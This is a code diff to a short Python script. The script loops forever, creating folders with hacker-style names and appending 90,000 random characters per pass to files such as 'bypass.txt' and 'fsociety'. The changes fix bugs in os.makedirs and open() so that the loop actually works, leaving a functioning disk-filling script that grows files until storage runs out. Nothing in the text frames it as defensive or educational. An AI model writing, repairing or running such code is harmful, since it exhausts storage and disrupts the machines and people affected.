@@ -3,19 +3,19 @@ import random
 import string
 
 while True:
-    os.makedirs("DarkParasites", "a" , exist_ok=True)
-    with open(f"DarkParasites/bypass.txt") as arquivo:
+    os.makedirs("DarkParasites", exist_ok=True)
+    with open(f"DarkParasites/bypass.txt", 'a') as arquivo:
          for _ in range(90000):
               arquivo.write(random.choice(string.ascii_letters + string.digits))
 
-    os.makedirs("Th3_g3ntl3m4n", "a" , exist_ok=True)
-    with open(f"Th3_g3ntl3m4n/t@nd3r@") as arquivo:
+    os.makedirs("Th3_g3ntl3m4n", exist_ok=True)
+    with open(f"Th3_g3ntl3m4n/t@nd3r@", 'a') as arquivo:
          for _ in range(90000):
               arquivo.write(random.choice(string.ascii_letters + string.digits))
 
 
-    os.makedirs("J0aninh@s", "a" , exist_ok=True)
-    with open(f"J0aninh@s/fsociety") as arquivo:
+    os.makedirs("J0aninh@s", exist_ok=True)
+    with open(f"J0aninh@s/fsociety", 'a') as arquivo:
          for _ in range(90000):
               arquivo.write(random.choice(string.ascii_letters + string.digits))
 
